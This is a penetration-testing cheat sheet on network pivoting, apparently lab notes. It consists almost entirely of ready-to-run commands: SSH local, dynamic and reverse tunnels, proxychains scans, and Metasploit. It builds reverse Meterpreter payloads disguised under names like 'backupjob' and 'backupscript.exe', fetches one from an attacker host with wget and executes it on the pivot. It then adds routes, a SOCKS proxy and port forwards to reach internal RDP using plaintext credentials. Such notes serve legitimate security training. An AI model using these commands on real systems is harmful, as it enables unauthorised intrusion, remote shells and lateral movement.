# Pivoting Methods

---

# Dynamic Port Forwarding with SSH and SOCKS

```
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ssh -L <local_port>:<remote_host>:<remote_port>
netstat -antp | grep 1234

nmap -v -sV -p1234 localhost
```

# Forwarding Multiple Ports

```
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

http://localhost:8080 --> http://10.129.202.64:80
mysql -h 127.0.0.1 -P 1234 -u ubuntu -p --> mysql -h 10.129.202.64 -P 3306 -u ubuntu

ssh -L 1445:localhost:445 -L
smbclient -L //127.0.0.1 -p 1445
```

# Proxychains with SOCKS

```
ssh -D 9050 ubuntu@10.129.202.64
tail -4 /etc/proxychains.conf

proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19

proxychains msfconsole
msf6 > search rdp_scanner

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

# Remote/Reverse Port Forwarding with SSH

```
Attacker (Kali) → 192.168.56.1
Pivot Host      → 10.10.10.5
Victim          → 10.10.10.20

# Create reverse HTTPS Meterpreter payload targeting Pivot Host's internal IP
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.5 LPORT=8080 -f exe -o backupscript.exe
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
msf6 > set lhost 0.0.0.0
msf6 > set lport 8000
msf6 > run

# Reverse tunnel: Pivot's 10.10.10.5:8080 → Kali's localhost:8000
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
ssh -R 10.10.10.5:8080:127.0.0.1:8000 ubuntu@10.10.10.5 -N -f
ssh -R 0.0.0.0:8080:127.0.0.1:8000 ubuntu@10.10.10.5 -N -f
```

# Meterpreter Tunneling & Port Forwarding

```
# Attacker HOST
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Attacker_IP -f elf -o backupjob LPORT=Attacker_PORT
msf6 > use exploit/multi/handler
msf6 > set lhost 0.0.0.0
msf6 > set lport 8080
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > run
python3 -m http.server 12000

# Pivot HOST
wget http://Attacker_IP:12000/backupjob
chmod +x backupjob
./backupjob

# Attacker HOST
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Configuring MSF's SOCKS Proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run

# Creating Routes with AutoRoute
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run

meterpreter > run autoroute -s 172.16.5.0/23

# Port Forwarding
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Reverse Port Forwarding Rules
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18





